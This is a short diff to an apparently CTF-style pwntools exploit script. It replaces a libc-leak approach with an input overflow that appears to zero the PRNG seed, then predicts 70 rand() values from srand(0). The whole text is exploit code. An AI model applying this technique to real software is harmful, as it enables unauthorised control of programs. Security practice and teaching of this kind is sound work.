@@ -21,6 +21,7 @@ def start(argv=[], *a, **kw):
 
 gdbscript = '''
 init-pwndbg
+breakrva 0x1660
 breakrva 0x15B2
 continue
 '''.format(**locals())
@@ -38,16 +39,10 @@ def init():
 def solve():
 
     libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
-    current_time = int(time.time())
     code = "uyscuti"
-    io.sendlineafter(b"system:", b"A")
-    io.recvuntil(b"A")
-    io.recvline()
-    leak = u64(io.recv(6).ljust(8, b"\x00"))
-    info("libc leak: %#x", leak)
-
+    io.sendlineafter(b"system:", b"A"*0xa + p32(0x0))
     io.sendlineafter(b"proceed:", code.encode())
-    libc.srand(current_time)
+    libc.srand(0)
 
     for i in range(70):
         valid = (libc.rand() + 8) % 20 + 1
@@ -70,3 +65,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
